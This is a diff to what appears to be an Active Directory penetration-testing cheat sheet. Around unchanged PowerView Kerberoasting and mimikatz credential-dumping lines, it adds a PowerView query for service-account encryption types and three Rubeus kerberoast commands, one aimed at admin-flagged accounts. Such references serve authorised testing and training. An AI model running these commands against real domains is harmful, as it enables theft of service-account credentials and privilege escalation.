@@ -164,6 +164,7 @@ PS C:\> Get-DomainUser
 PS C:\> Get-DomainUser * -spn | select samaccountname
 PS C:\> Get-DomainUser -Identity <username> | Get-DomainSPNTicket -Format Hashcat
 PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+PS C:\> Get-DomainUser <username> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
 PS C:\> Get-DomainComputer
 PS C:\> Get-DomainGroup
 PS C:\> Get-DomainOU
@@ -1948,6 +1949,14 @@ mimikatz # sekurlsa::credman
 mimikatz # vault::cred
 mimikatz # sekurlsa::ekeys
 mimikatz # misc::cmd
+```
+
+- Rubeus
+
+```
+C:\> .\Rubeus.exe kerberoast /stats
+C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+C:\> .\Rubeus.exe kerberoast /user:testspn /nowrap
 ```
 
 - DPAPI
